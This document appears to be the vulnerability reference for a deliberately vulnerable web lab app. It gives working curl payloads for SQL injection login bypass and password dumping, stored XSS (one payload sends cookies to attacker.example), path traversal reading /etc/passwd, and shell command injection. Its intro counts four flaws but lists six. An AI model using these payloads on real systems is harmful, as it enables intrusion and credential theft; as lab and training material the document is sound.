# Vulnerability Reference

All four vulnerabilities below are intentional and present in the baseline (unprotected) configuration. Each entry lists the exact endpoint, the source file and line where the vulnerability lives, and a working `curl` command that exploits it end-to-end.

> **Note:** Commands that require authentication save cookies to a `cookies.txt` jar via `-c cookies.txt` and reuse them via `-b cookies.txt`. Run the login step first in any session where you need a valid cookie.

---

## 1. SQL Injection — Authentication Bypass

**Endpoint:** `POST /login`

**Source:** `src/routes/auth.js`, inside `router.post('/login', ...)`:
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**How it works:** The `username` field is embedded directly in the SQL string. Injecting `' OR '1'='1' --` closes the username string, adds an always-true condition, and comments out the `AND password = ...` clause — returning the first row in the table (admin) unconditionally, with no valid password required.

### curl PoC — login bypass, receive admin session

```bash
curl -i -s -c cookies.txt \
  -X POST http://localhost:3000/login \
  --data-urlencode "username=' OR '1'='1' --" \
  --data-urlencode "password=anything"
```

Expected: HTTP `302 Found` redirect to `/posts` with a `Set-Cookie: connect.sid=...` header. The `cookies.txt` jar now contains the admin session cookie.

### Verify admin access

```bash
curl -s -b cookies.txt http://localhost:3000/admin | grep -o '<h1>[^<]*</h1>'
```

Expected output: `<h1>Admin Panel</h1>`

---

## 2. SQL Injection — UNION-Based Data Exfiltration

**Endpoint:** `GET /posts/search?q=`

**Source:** `src/routes/posts.js`, inside `router.get('/search', ...)`:
```javascript
const query = `SELECT p.*, u.username FROM posts p JOIN users u ON p.user_id = u.id WHERE p.title LIKE '%${q}%' OR p.content LIKE '%${q}%' ORDER BY p.created_at DESC`;
```

**How it works:** The `q` parameter is embedded directly in LIKE clauses. A UNION-based injection appends an attacker-controlled SELECT that pulls data from any table and renders it in the post list HTML.

The `posts` table has 7 columns: `id, user_id, title, content, attachment, created_at, updated_at`. The UNION must match this shape. To extract usernames and passwords, map them into `title` and `content`.

### Step 1 — Get a valid session (legitimate login)

```bash
curl -i -s -c cookies.txt \
  -X POST http://localhost:3000/login \
  --data-urlencode "username=alice" \
  --data-urlencode "password=alice123"
```

### Step 2 — UNION injection to dump users table

```bash
curl -s -b cookies.txt -G \
  --data-urlencode "q=%' UNION SELECT 1, u.id, u.username, u.password, NULL, NOW(), NOW() FROM users u --" \
  "http://localhost:3000/posts/search"
```

Expected: The response HTML contains post list entries where the `title` links show each username and the post body shows the corresponding plaintext password.

---

## 3. Stored XSS — Bio Field

**Store endpoint:** `POST /profile`
**Trigger endpoint:** `GET /users/:id`

**Source:** `views/profile.ejs`:
```ejs
<div class="bio"><%- profile.bio || '<em>No bio set.</em>' %></div>
```

**How it works:** EJS `<%- %>` outputs raw HTML without escaping. A `<script>` tag saved in the bio field is injected directly into the page DOM and executes in the browser of any user who visits that profile.

### Step 1 — Login as alice

```bash
curl -i -s -c alice_cookies.txt \
  -X POST http://localhost:3000/login \
  --data-urlencode "username=alice" \
  --data-urlencode "password=alice123"
```

### Step 2 — Store XSS payload in bio

```bash
curl -s -b alice_cookies.txt \
  -X POST http://localhost:3000/profile \
  --data-urlencode 'bio=<script>document.write("<img src=x onerror=alert(document.cookie)>")</script>'
```

### Step 3 — Login as bob and visit alice's profile (user_id = 2)

```bash
curl -i -s -c bob_cookies.txt \
  -X POST http://localhost:3000/login \
  --data-urlencode "username=bob" \
  --data-urlencode "password=bob123"

curl -s -b bob_cookies.txt http://localhost:3000/users/2
```

Expected: The response body contains the raw `<script>` tag un-escaped. In a browser, this executes and pops `alert(document.cookie)`.

---

## 4. Stored XSS — Post Content

**Store endpoint:** `POST /posts`
**Trigger endpoint:** `GET /posts/:id`

**Source:** `views/posts/show.ejs`:
```ejs
<div class="post-content"><%- post.content %></div>
```

### Step 1 — Login as alice

```bash
curl -i -s -c alice_cookies.txt \
  -X POST http://localhost:3000/login \
  --data-urlencode "username=alice" \
  --data-urlencode "password=alice123"
```

### Step 2 — Create a post with a script payload

```bash
curl -i -s -b alice_cookies.txt \
  -X POST http://localhost:3000/posts \
  -F 'title=Totally Normal Post' \
  -F 'content=<script>fetch("http://attacker.example/steal?c="+document.cookie)</script>'
```

Note the `Location` header in the response to find the new post ID.

### Step 3 — Another user visits the post (replace 11 with actual ID)

```bash
curl -i -s -c bob_cookies.txt \
  -X POST http://localhost:3000/login \
  --data-urlencode "username=bob" \
  --data-urlencode "password=bob123"

curl -s -b bob_cookies.txt http://localhost:3000/posts/11
```

Expected: Raw `<script>` tag in the response body.

---

## 5. Path Traversal / LFI

**Endpoint:** `GET /posts/:id/attachment?file=<filename>`

**Source:** `src/routes/posts.js`, inside `router.get('/:id/attachment', ...)`:
```javascript
const filePath = path.join(UPLOAD_DIR, file);
fs.readFile(filePath, (err, data) => { ... res.send(data); });
```

**How it works:** `path.join` resolves `../` sequences in `file` but does not prevent the result from escaping `UPLOAD_DIR`. With enough `../` steps the attacker can reach any file on the container filesystem that the Node process can read.

Inside the container: `UPLOAD_DIR=/app/uploads`, so `../../../etc/passwd` resolves to `/etc/passwd`.

### Step 1 — Get a valid session

```bash
curl -i -s -c cookies.txt \
  -X POST http://localhost:3000/login \
  --data-urlencode "username=alice" \
  --data-urlencode "password=alice123"
```

### Step 2 — Read /etc/passwd from the container

```bash
curl -s -b cookies.txt \
  "http://localhost:3000/posts/1/attachment?file=../../../etc/passwd"
```

Expected: Raw contents of `/etc/passwd` inside the container.

### Alternative — read the app's own source

```bash
curl -s -b cookies.txt \
  "http://localhost:3000/posts/1/attachment?file=../../src/routes/auth.js"
```

---

## 6. Command Injection

**Endpoint:** `POST /admin/ping`

**Source:** `src/routes/admin.js`, inside `router.post('/ping', ...)`:
```javascript
exec(`ping -c 3 ${host}`, { timeout: 10000 }, ...);
```

**How it works:** The `host` parameter is embedded directly in a shell command string passed to `child_process.exec`. Shell metacharacters (`;`, `&&`, `|`) chain additional commands that execute as the Node process user.

### Step 1 — Login as admin

```bash
curl -i -s -c cookies.txt \
  -X POST http://localhost:3000/login \
  --data-urlencode "username=admin" \
  --data-urlencode "password=admin123"
```

### Step 2 — Inject ; cat /etc/passwd after a valid host

```bash
curl -s -b cookies.txt \
  -X POST http://localhost:3000/admin/ping \
  --data-urlencode "host=127.0.0.1 ; cat /etc/passwd"
```

Expected: The response HTML contains a `<pre class="output">` block with the ping output followed immediately by the full contents of `/etc/passwd`.

### Alternative — run whoami

```bash
curl -s -b cookies.txt \
  -X POST http://localhost:3000/admin/ping \
  --data-urlencode "host=127.0.0.1 ; whoami"
```

### Alternative — read environment variables (may expose secrets)

```bash
curl -s -b cookies.txt \
  -X POST http://localhost:3000/admin/ping \
  --data-urlencode "host=127.0.0.1 ; env"
```
